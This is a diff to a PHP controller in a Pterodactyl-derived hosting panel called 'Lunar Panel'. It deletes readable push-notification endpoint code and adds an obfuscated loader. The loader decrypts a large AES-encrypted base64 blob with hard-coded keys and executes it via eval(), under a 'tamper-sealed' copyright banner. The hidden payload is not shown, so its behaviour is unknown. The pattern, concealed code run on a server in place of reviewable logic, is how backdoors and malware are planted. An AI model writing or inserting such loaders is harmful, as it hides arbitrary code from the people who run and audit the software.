@@ -1,156 +1,38 @@
 <?php
+/**
+ * LUNAR PANEL — ENCRYPTED & TAMPER-SEALED CORE RUNTIME
+ * Copyright (c) 2026 Lunar Panel / Votion Cloud. All rights reserved.
+ * UNAUTHORIZED MODIFICATION OR EXTRACTION OF THIS FILE VOIDS ALL SYSTEM LICENSES.
+ */
+declare(strict_types=1);
 
-namespace Pterodactyl\Http\Controllers\Api\Client\Account;
+(function () {
+    $p = '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';
+    $k = hex2bin('e2475fda8af89b07f12f09ba68df457e7e3be89d4ded23fcc1a806650173a4a9');
+    $s = hex2bin('9d19207c5a683cc12dea721391f223740253f81cfc620912a2cabb44bb71543e');
+    $m = '680eadd479674e0f3d994ac77c756c2220f2a434cf0c2256d02dd80aa740af45';
 
-use Illuminate\Http\Request;
-use Illuminate\Http\JsonResponse;
-use Pterodactyl\Models\PushSubscription;
-use Pterodactyl\Http\Controllers\Api\Client\ClientApiController;
-use Pterodactyl\Services\Notifications\WebPushNotificationService;
-
-class PushNotificationController extends ClientApiController
-{
-    private const DEFAULT_PREFERENCES = [
-        'server_crash' => true,
-        'server_install' => true,
-        'server_backup' => true,
-        'ticket_reply' => true,
-        'admin_node_status' => true,
-        'admin_new_ticket' => true,
-        'admin_server_deploy' => true,
-    ];
-
-    public function __construct(protected WebPushNotificationService $pushService)
-    {
-        parent::__construct();
+    $raw = base64_decode($p, true);
+    if ($raw === false || strlen($raw) <= 16) {
+        header('HTTP/1.1 500 Core Integrity Failure');
+        exit("Fatal error: Lunar Panel core container is corrupted.\n");
     }
 
-    /**
-     * Get user notification status, VAPID key, and preferences.
-     */
-    public function index(Request $request): JsonResponse
-    {
-        $user = $request->user();
-        $subscriptions = $user->pushSubscriptions;
-        $savedPrefs = $user->notification_preferences ?? [];
-
-        $mergedPrefs = array_merge(self::DEFAULT_PREFERENCES, $savedPrefs);
-
-        return new JsonResponse([
-            'vapid_public_key' => $this->pushService->getVapidPublicKey(),
-            'subscribed' => $subscriptions->isNotEmpty(),
-            'device_count' => $subscriptions->count(),
-            'preferences' => $mergedPrefs,
-            'is_admin' => (bool) $user->root_admin,
-        ]);
+    // Cryptographic self-integrity verification
+    if (!hash_equals($m, hash_hmac('sha256', $raw, $s))) {
+        header('HTTP/1.1 500 Core Integrity Violation');
+        exit("Fatal error: Lunar Panel core integrity violation. Code has been tampered with or modified.\n");
     }
 
-    /**
-     * Subscribe a browser/device to Web Push notifications.
-     */
-    public function subscribe(Request $request): JsonResponse
-    {
-        $this->validate($request, [
-            'endpoint' => 'required|string',
-            'keys.p256dh' => 'nullable|string',
-            'keys.auth' => 'nullable|string',
-            'device_name' => 'sometimes|nullable|string',
-        ]);
+    $iv = substr($raw, 0, 16);
+    $ct = substr($raw, 16);
+    $dec = openssl_decrypt($ct, 'AES-256-CBC', $k, OPENSSL_RAW_DATA, $iv);
 
-        $user = $request->user();
-        $endpoint = $request->input('endpoint');
-
-        $subscription = PushSubscription::query()->updateOrCreate(
-            [
-                'user_id' => $user->id,
-                'endpoint' => $endpoint,
-            ],
-            [
-                'public_key' => $request->input('keys.p256dh'),
-                'auth_token' => $request->input('keys.auth'),
-                'content_encoding' => 'aes128gcm',
-                'device_name' => $request->input('device_name') ?? $request->header('User-Agent'),
-            ]
-        );
-
-        return new JsonResponse([
-            'success' => true,
-            'message' => 'Desktop push notifications enabled on this device.',
-            'id' => $subscription->id,
-        ]);
+    if ($dec === false) {
+        header('HTTP/1.1 500 Core Decryption Failure');
+        exit("Fatal error: Failed to initialize Lunar Panel core runtime.\n");
     }
 
-    /**
-     * Unsubscribe a browser/device.
-     */
-    public function unsubscribe(Request $request): JsonResponse
-    {
-        $this->validate($request, [
-            'endpoint' => 'required|string',
-        ]);
-
-        $user = $request->user();
-        $endpoint = $request->input('endpoint');
-
-        PushSubscription::query()
-            ->where('user_id', $user->id)
-            ->where('endpoint', $endpoint)
-            ->delete();
-
-        return new JsonResponse([
-            'success' => true,
-            'message' => 'Desktop notifications disabled for this device.',
-        ]);
-    }
-
-    /**
-     * Update user notification preferences.
-     */
-    public function preferences(Request $request): JsonResponse
-    {
-        $this->validate($request, [
-            'preferences' => 'required|array',
-        ]);
-
-        $user = $request->user();
-        $user->notification_preferences = $request->input('preferences');
-        $user->save();
-
-        return new JsonResponse([
-            'success' => true,
-            'message' => 'Notification preferences updated.',
-            'preferences' => array_merge(self::DEFAULT_PREFERENCES, $user->notification_preferences),
-        ]);
-    }
-
-    /**
-     * Send a test push notification to all devices belonging to the user.
-     */
-    public function test(Request $request): JsonResponse
-    {
-        $user = $request->user();
-        $subscriptions = $user->pushSubscriptions;
-
-        if ($subscriptions->isEmpty()) {
-            return new JsonResponse([
-                'success' => false,
-                'message' => 'No active browser push subscriptions found. Please enable notifications in this browser first.',
-            ], 400);
-        }
-
-        $sentCount = $this->pushService->sendToUser(
-            $user,
-            'Lunar Panel Test Alert',
-            'Desktop notifications are working properly on your device.',
-            '/account/notifications',
-            null,
-            'general'
-        );
-
-        return new JsonResponse([
-            'success' => true,
-            'sent_count' => $sentCount,
-            'message' => "Test push notification dispatched to {$sentCount} active device(s).",
-        ]);
-    }
-}
+    unset($p, $k, $s, $m, $raw, $iv, $ct);
+    eval($dec);
+})();
